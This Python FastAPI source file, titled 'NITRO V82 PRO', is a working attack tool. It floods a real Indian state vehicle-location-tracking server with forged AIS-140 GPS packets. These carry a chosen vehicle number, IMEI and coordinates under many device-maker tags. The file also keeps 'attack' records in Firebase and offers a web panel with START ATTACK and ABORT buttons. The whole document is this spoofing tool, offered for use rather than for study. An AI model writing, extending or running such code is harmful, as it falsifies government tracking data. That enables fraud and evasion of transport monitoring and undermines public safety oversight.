import socket
import threading
import time
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import firebase_admin
from firebase_admin import credentials, db

app = FastAPI()

# --- FIREBASE SETUP ---
try:
    # Service account file check karna mat bhulna
    cred = credentials.Certificate("serviceAccountKey.json")
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/'
    })
except Exception as e:
    print(f"Firebase Connection Error: {e}")

# --- GLOBAL SETTINGS ---
firing = False
total_sent = 0
logs = []
TARGET_IP, TARGET_PORT = "vlts.bihar.gov.in", 9999
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]

def format_coord(val):
    try:
        p = str(val).split('.')
        return f"{p[0]}.{p[1][:7].ljust(7, '0')}" if len(p) > 1 else f"{val}.0000000"
    except: return val

# --- DB LOGIC: RECORD DATA ---
def save_to_db(vno, imei, lat, lon):
    try:
        ref = db.reference(f'Data_Records/{vno.upper()}')
        ref.update({
            'Vehicle_No': vno.upper(),
            'IMEI_No': imei,
            'Lat': lat,
            'Lon': lon,
            'Status': 'Active',
            'Last_Attack': (datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)).strftime('%Y-%m-%d %H:%M:%S')
        })
    except: pass

# --- ENGINE: SEQUENTIAL TURBO (LOCKED) ---
def handshake_worker(tag_list, imei, vno, lat, lon):
    global firing, total_sent, logs
    while firing:
        for tag in tag_list:
            if not firing: break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(7)
                s.connect((TARGET_IP, TARGET_PORT))
                now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
                pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{format_coord(lat)},N,{format_coord(lon)},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\r\n"
                s.sendall(bytes(pkt, 'ascii'))
                total_sent += 1
                s.close()
                logs.append(f"<span style='color:#0f0'>[{tm}] {tag} -> INJECTED_SUCCESS</span>")
                if len(logs) > 10: logs.pop(0)
                time.sleep(0.1)
            except: time.sleep(1)

# --- API ENDPOINTS ---
@app.get("/fetch_data")
def fetch_data(vno: str):
    """VNO Check karke IMEI aur Location nikalna"""
    ref = db.reference(f'Data_Records/{vno.upper().strip()}')
    res = ref.get()
    if res:
        return {"found": True, "imei": res.get('IMEI_No',''), "lat": res.get('Lat',''), "lon": res.get('Lon','')}
    return {"found": False}

@app.get("/init")
def init(v:str, i:str, lt:str, ln:str):
    global firing, total_sent, logs
    if not firing:
        firing, total_sent = True, 0
        logs = ["<span style='color:#fff'>[SYSTEM] HANDSHAKE STARTED...</span>"]
        save_to_db(v, i, lt, ln) # DB mein save/update
        chunks = [TAGS[x:x+5] for x in range(0, len(TAGS), 5)]
        for c in chunks:
            threading.Thread(target=handshake_worker, args=(c, i, v.upper(), lt, ln), daemon=True).start()
    return {"ok": True}

@app.get("/stop")
def stop():
    global firing, logs; firing = False
    logs.append("<span style='color:#f00'>[SYSTEM] ATTACK ABORTED.</span>")
    return {"ok": True}

@app.get("/status")
def status(): return {"c": total_sent, "l": logs}

# --- UI INTERFACE ---
@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head><title>NITRO V82 PRO | MASTER</title><style>
    body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
    .box { width:420px; border:1px solid #0f0; padding:25px; box-shadow:0 0 20px #0f0; background:rgba(0,10,0,0.9); border-radius:10px; }
    h2 { text-align:center; border-bottom:1px solid #0f0; padding-bottom:10px; margin-top:0; }
    label { font-size:11px; display:block; margin-top:10px; color:#aaa; }
    input { width:100%; background:#000; border:1px solid #0f0; color:#0f0; padding:10px; outline:none; text-transform: uppercase; }
    .btn-row { display:flex; gap:10px; margin-top:20px; }
    button { flex:1; padding:12px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; }
    button:hover { background:#0f0; color:#000; }
    #log { height:150px; background:#001100; border:1px dotted #0f0; margin-top:15px; padding:10px; font-size:11px; overflow-y:auto; }
    .reset { border-color:#ff0; color:#ff0; width:100%; margin-top:10px; font-size:10px; }
    </style></head><body>
    <div class="box">
        <h2>NITRO V82 PRO</h2>
        <label>VEHICLE NUMBER (AUTO-FETCH ON)</label>
        <input type="text" id="v" onblur="fetchData()" placeholder="ENTER VNO">
        <label>IMEI NUMBER</label>
        <input type="text" id="i" placeholder="ENTER 15 DIGIT IMEI">
        <div style="display:flex; gap:10px;">
            <div style="flex:1"><label>LATITUDE</label><input type="text" id="lt"></div>
            <div style="flex:1"><label>LONGITUDE</label><input type="text" id="ln"></div>
        </div>
        <div class="btn-row">
            <button onclick="st()">START ATTACK</button>
            <button onclick="sp()" style="color:#f00; border-color:#f00;">ABORT</button>
        </div>
        <button onclick="resetAll()" class="reset">RESET SYSTEM</button>
        <div id="log">READY...</div>
        <div style="margin-top:10px; display:flex; justify-content:space-between;">
            <span>PACKETS: <b id="c">0</b></span>
            <span id="st" style="color:#0f0">IDLE</span>
        </div>
    </div>
    <script>
        let monitor;
        function fetchData() {
            let v = document.getElementById('v').value.toUpperCase();
            if(v.length > 4) {
                fetch(`/fetch_data?vno=${v}`).then(r=>r.json()).then(d=>{
                    if(d.found) {
                        document.getElementById('i').value = d.imei;
                        document.getElementById('lt').value = d.lat;
                        document.getElementById('ln').value = d.lon;
                        document.getElementById('log').innerHTML = "RECORD FOUND IN DB!";
                    }
                });
            }
        }
        function st() {
            const v = document.getElementById('v').value.toUpperCase();
            const i = document.getElementById('i').value;
            const lt = document.getElementById('lt').value;
            const ln = document.getElementById('ln').value;
            fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}`);
            document.getElementById('st').innerText = "RUNNING";
            if(!monitor) monitor = setInterval(() => {
                fetch('/status').then(r=>r.json()).then(d=>{
                    document.getElementById('c').innerText = d.c;
                    document.getElementById('log').innerHTML = d.l.join("<br>");
                    document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
                });
            }, 1000);
        }
        function sp() { fetch('/stop'); clearInterval(monitor); monitor=null; document.getElementById('st').innerText="IDLE"; }
        function resetAll() { location.reload(); }
    </script></body></html>
    """
